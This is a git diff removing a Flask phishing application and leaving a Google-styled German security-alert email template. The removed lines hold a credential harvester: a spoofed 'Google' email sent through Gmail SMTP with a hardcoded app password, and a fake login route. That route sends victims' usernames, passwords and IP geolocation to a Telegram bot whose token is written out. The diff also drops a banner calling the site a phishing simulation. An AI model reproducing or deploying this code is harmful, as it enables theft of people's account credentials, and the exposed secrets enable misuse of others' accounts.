@@ -1,34 +1,3 @@
-from flask import Flask, render_template, request, redirect
-from flask_basicauth import BasicAuth
-import requests
-import smtplib
-
-app = Flask(__name__)
-app.static_folder = 'static'
-app.static_url_path = '/static'
-
-app.config['BASIC_AUTH_USERNAME'] = 'demo'
-app.config['BASIC_AUTH_PASSWORD'] = 'demo'
-
-basic_auth = BasicAuth(app)
-
-
-@app.route('/')
-@basic_auth.required
-def index():
-    return render_template('index.html')
-
-
-@app.route('/email')
-@basic_auth.required
-def email():
-    return render_template('email.html')
-
-
-@app.route('/send', methods=['POST'])
-def send_email():
-    adress = request.form['email']
-    htmlmessage = """
 <!DOCTYPE html>
 <html lang="en">
 
@@ -148,14 +117,12 @@ def send_email():
         <tr height="32" style="height: 32px;">
             <td></td>
         </tr>
-                                        <p style="color:red;margin-left:auto;margin-right:auto;">This website is used for simulating phishing attacks. Please do not enter any personal data as it could be stored insecurely.</p>
-
         <tr align="center">
             <td>
                 <div itemscope itemtype="//schema.org/EmailMessage">
                     <div itemprop="action" itemscope itemtype="//schema.org/ViewAction">
                         <link itemprop="url"
-                            href="login-clone.vercel.app" />
+                            href="https://accounts.google.com/AccountChooser?Email=sascha.zesiger@gmail.com&amp;continue=https://myaccount.google.com/alert/nt/1664117620000?rfn%3D325%26rfnc%3D1%26eid%3D-956515703213323102%26et%3D0" />
                         <meta itemprop="name" content="Aktivität überprüfen" />
                     </div>
                 </div>
@@ -178,7 +145,7 @@ def send_email():
                                                     src="https://lh3.googleusercontent.com/a/ALm5wu1c8vpryghTuxkedMNAIt57LBZWhW8CraaqPuag=s96"
                                                     alt=""></td>
                                             <td><a
-                                                    style="font-family: &#39;Google Sans&#39;,Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color: rgba(0,0,0,0.87); font-size: 14px; line-height: 20px;">"""+adress+"""</a>
+                                                    style="font-family: &#39;Google Sans&#39;,Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color: rgba(0,0,0,0.87); font-size: 14px; line-height: 20px;">testmail</a>
                                             </td>
                                         </tr>
                                     </table>
@@ -218,57 +185,7 @@ def send_email():
         <tr height="32" style="height: 32px;">
             <td></td>
         </tr>
-        
     </table>
 </body>
 
-</html>
-    """
-    try:
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        headers = "\r\n".join(["from: " + "Google" + " <" + "jh.temp.04@gmail.com" + ">",
-                               "subject: Wichtige Mitteilung bezüglich Ihres Kontos",
-                               "to: " + adress,
-                               "mime-version: 1.0",
-                               "content-type: text/html"])
-        server.login('jh.temp.04@gmail.com', 'wnrwgxehiodfqvxc')
-        message = headers.encode('utf-8') + b"\r\n\r\n" + \
-            htmlmessage.encode('utf-8')
-        server.sendmail('jh.temp.04@gmail.com', adress, message)
-        server.quit()
-        return 'Email sent successfully!'
-    except Exception as e:
-        return 'Something went wrong: ' + str(e)
-
-
-@app.route('/pass')
-@basic_auth.required
-def passwd():
-
-    user = request.args.get('email')
-    if not user.endswith('@gmail.com'):
-        user = user + "@gmail.com"
-    print(user)
-    return render_template('passwd.html', user=user)
-
-
-@app.route('/login')
-@basic_auth.required
-def login():
-    username = request.args.get('username')
-    password = request.args.get('password')
-    ip = request.remote_addr
-    # IP-Daten von ip-api.com abrufen
-    response = requests.get(f"http://ip-api.com/json/{ip}")
-    ip_data = response.json()
-    # Nachricht an Telegram senden
-    message = f"Login-Informationen:\nBenutzername: {username}\nPasswort: {password}\nIP-Data: {ip_data}"
-    requests.get(
-        f"https://api.telegram.org/bot5751384094:AAGiPu72GJlp4JziOkQvnpMtIH2EZsF1JmQ/sendMessage?chat_id=608885714&disable_web_page_preview=true&disable_web_page_preview=true&text={message}")
-
-    return redirect("https://myaccount.google.com/")
-
-
-if __name__ == '__main__':
-    app.run()
+</html>"""
